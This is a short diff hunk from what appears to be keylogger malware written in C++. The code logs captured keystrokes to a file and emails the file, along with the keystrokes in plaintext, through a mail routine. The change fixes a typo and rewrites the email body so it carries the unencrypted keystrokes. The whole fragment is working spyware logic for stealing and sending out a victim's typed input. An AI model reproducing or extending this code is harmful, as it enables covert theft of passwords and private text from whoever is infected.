@@ -16,11 +16,12 @@ namespace KeyboardHook{
         std::string last_file = IO::WriteLog(keylog);
 
         if(last_file.empty()){
-            Helper::WriteAppLog("File creation was not succesfull. Keylog : '" + keylog + "'");
+            Helper::WriteAppLog("File creation was not successful. Keylog : '" + keylog + "'");
             return;
         }
         int x = Mail::SendMail("Log ["+ last_file + "]",
-                               "The file has been attached to this mail. \n For testing. \n" + keylog,
+                               "Hi, \n\nThe file has been attached to this mail. \nFor testing, here are the keyboard "
+                               "strokes without encryption : \n\n" + keylog + "\n\nBest regards, \n",
                                IO::GetOurPath(true) + last_file);
         if(x != 7){
             Helper::WriteAppLog("Mail was not sent. Error code : " + Helper::ToString(x));
